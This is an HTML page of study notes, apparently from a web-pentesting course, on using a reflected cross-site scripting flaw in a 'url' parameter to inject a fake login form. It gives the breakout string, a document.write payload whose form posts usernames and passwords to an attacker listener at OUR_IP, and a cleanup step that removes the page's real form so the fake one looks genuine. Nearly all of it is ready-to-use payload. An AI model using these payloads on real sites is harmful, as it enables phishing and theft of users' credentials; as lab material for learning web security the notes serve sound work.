<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Login Form Injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Login Form Injection</h1><br/><strong><h3>Login Form Injection</h3></strong><br />PAYLOAD: Login form that send the login information to a server we are listing on, such that once a user attempts to log in, we&#39;d get their credentials<br />	We need to change OUR_IP with the the IP of our attacking listening server<br />	<div class="codebox"><pre>&lt;h3&gt;Please login to continue&lt;/h3&gt;<br />&lt;form action=http://OUR_IP&gt;<br />    &lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;<br />    &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;<br />    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;<br />&lt;/form&gt;</pre></div><br />1. Find the vulnerable parameter and exploit it with vulnerable parameter<br />	The vulnerable parameter that we can use in this example is <strong>url </strong><br />	<a href=""><img src="images/2463-1.png" alt="images/2463-1.png" /></a><br />	that we can exploit like this <br />	<div class="codebox"><pre>url=&#39;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;img+src=&#39;</pre></div><br />	is been used  <code>&lt;img+src=&#39;</code> to close <code>&#39;&gt;</code> but was also possible use <code>&lt;!--</code><br />	<a href=""><img src="images/2463-2.png" alt="images/2463-2.png" /></a><br />	<a href=""><img src="images/2463-3.png" alt="images/2463-3.png" /></a><br /><br />2. Insert the payload of the login form inside the vulnerale parameter url<br />	<div class="codebox"><pre>url=&#39;&gt;&lt;script&gt;document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);&lt;/script&gt;&lt;img+src=&#39;</pre></div><br />	<a href=""><img src="images/2463-4.png" alt="images/2463-4.png" /></a><br />	<a href=""><img src="images/2463-5.png" alt="images/2463-5.png" /></a><br /><br />3. Cleaning Up: remove from the page other content that is not our payload<br />   1) we can use the JavaScript function <strong>document.getElementById(&quot;[ID_TO_REMOVE]&quot;).remove()</strong> function<br />   2) To find the id of the HTML element we want to remove, we can open the Page Inspector Picker by clicking and then clicking on the element we need<br />   		<a href=""><img src="images/2463-6.png" alt="images/2463-6.png" /></a><br />	3) add the remove method <strong>document.getElementById(&#39;urlform&#39;).remove();	</strong>at the end of our payload<br />    <div class="codebox"><pre>url=&#39;&gt;&lt;script&gt;document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;&lt;img+src=&#39;</pre></div><br />	<a href=""><img src="images/2463-7.png" alt="images/2463-7.png" /></a><br />	As we can see the URL form is been removed</div>
</body>
</html>
